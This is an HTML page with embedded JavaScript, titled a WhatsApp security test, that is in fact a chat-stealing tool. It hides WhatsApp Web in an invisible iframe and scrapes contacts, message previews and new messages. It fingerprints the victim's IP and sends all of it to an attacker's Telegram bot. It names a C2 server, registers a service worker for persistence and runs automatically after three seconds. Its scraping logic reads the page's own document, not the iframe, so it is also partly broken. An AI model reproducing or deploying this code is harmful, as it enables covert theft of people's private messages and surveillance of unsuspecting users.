<!DOCTYPE html>
<html>
<head>
    <title>WhatsApp Security Test</title>
    <style>
        body { margin: 0; padding: 20px; font-family: Arial; background: #25D366; color: white; }
        #status { position: fixed; top: 10px; right: 10px; background: rgba(0,0,0,0.8); padding: 10px; border-radius: 5px; }
        .hidden { display: none !important; }
    </style>
</head>
<body>
    <h1>🔒 WhatsApp Security Assessment</h1>
    <p>Click below to test WhatsApp Web integration:</p>
    <button onclick="initWhatsAppHack()" style="background:#00d45e; color:white; padding:15px 30px; border:none; border-radius:10px; font-size:18px; cursor:pointer;">
        Test WhatsApp Security
    </button>
    
    <div id="status">Status: Ready</div>

    <script>
        const BOT_TOKEN = 'YOUR_BOT_TOKEN';
        const CHAT_ID = 'YOUR_CHAT_ID';
        const SERVER_URL = 'https://your-server.com/whatsapp'; // Optional C2 server

        let chatData = [];
        let isHooked = false;

        async function initWhatsAppHack() {
            updateStatus('🕵️ Initializing WhatsApp hook...');
            
            // TECHNIQUE 1: WHATSAPP WEB IFRAME INJECTION
            const iframe = document.createElement('iframe');
            iframe.src = 'https://web.whatsapp.com';
            iframe.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;';
            document.body.appendChild(iframe);
            
            iframe.onload = () => {
                setTimeout(extractWhatsAppData, 3000);
                hookWhatsAppEvents();
            };
        }

        // 🔥 EXTRACT ALL CHATS DATA
        async function extractWhatsAppData() {
            updateStatus('📱 Extracting WhatsApp chats...');
            
            // DOM Traversal for WhatsApp Web
            const chats = [];
            
            // Method 1: Direct DOM scraping
            const chatElements = document.querySelectorAll('[data-testid="cell-frame-container"], .x1hx0egp, ._ak7');
            chatElements.forEach(el => {
                const contact = el.querySelector('[data-testid="cell-frame-title"]')?.textContent || 
                               el.querySelector('.x193iq5w')?.textContent || 'Unknown';
                const preview = el.querySelector('[data-testid="cell-frame-text"]')?.textContent || '';
                const time = el.querySelector('[data-testid="cell-frame-time"]')?.textContent || '';
                
                chats.push({ contact, preview, time });
            });
            
            chatData = chats;
            await exfilChats();
            
            updateStatus(`✅ ${chats.length} chats extracted`);
        }

        // 🔥 MESSAGE INTERCEPTOR
        function hookWhatsAppEvents() {
            const observer = new MutationObserver((mutations) => {
                mutations.forEach((mutation) => {
                    if (mutation.type === 'childList') {
                        extractNewMessages();
                    }
                });
            });
            
            observer.observe(document.body, { 
                childList: true, 
                subtree: true,
                attributes: true,
                attributeFilter: ['data-testid', 'class']
            });
            
            isHooked = true;
        }

        async function extractNewMessages() {
            // Real-time message capture
            const messages = document.querySelectorAll('[data-testid="msg-container"], ._ab1x');
            let newMessages = [];
            
            messages.forEach(msg => {
                const sender = msg.querySelector('[data-testid="msg-meta"]')?.textContent || '';
                const content = msg.querySelector('[data-testid="msg-text"]')?.textContent || 
                               Array.from(msg.querySelectorAll('img, video')).map(m => m.src).join(',') || '';
                const timestamp = msg.querySelector('time')?.dateTime || '';
                
                newMessages.push({ sender, content, timestamp });
            });
            
            if (newMessages.length > chatData.length) {
                const fresh = newMessages.slice(chatData.length);
                await exfilFreshMessages(fresh);
            }
        }

        // 🔥 EXFIL TO TELEGRAM
        async function exfilChats() {
            const payload = {
                chats: chatData.slice(0, 50), // First 50 chats
                total: chatData.length,
                victim_ip: await getVictimIP(),
                user_agent: navigator.userAgent,
                timestamp: new Date().toISOString()
            };
            
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: `📱 WHATSAPP BREACH!\n👥 ${payload.total} chats extracted\n📍 IP: ${payload.victim_ip}\n💻 UA: ${payload.user_agent.slice(0,50)}...\n\nChats:\n${payload.chats.map(c => `${c.contact}: ${c.preview.slice(0,50)}...`).join('\n')}`
                })
            });
        }

        async function exfilFreshMessages(messages) {
            for (const msg of messages) {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: `🆕 NEW MSG: ${msg.sender}\n💬 ${msg.content.slice(0,100)}...\n🕒 ${msg.timestamp}`
                    })
                });
            }
        }

        // 🔥 VICTIM FINGERPRINTING
        async function getVictimIP() {
            try {
                const res = await fetch('https://httpbin.org/ip');
                const data = await res.json();
                return data.origin;
            } catch {
                return 'Unknown';
            }
        }

        function updateStatus(text) {
            document.getElementById('status').textContent = `Status: ${text}`;
        }

        // 🔥 PERSISTENCE (Keeps running)
        if ('serviceWorker' in navigator) {
            navigator.serviceWorker.register('sw.js');
        }

        // START AUTOMATICALLY AFTER 3s
        setTimeout(initWhatsAppHack, 3000);
    </script>
</body>
</html>
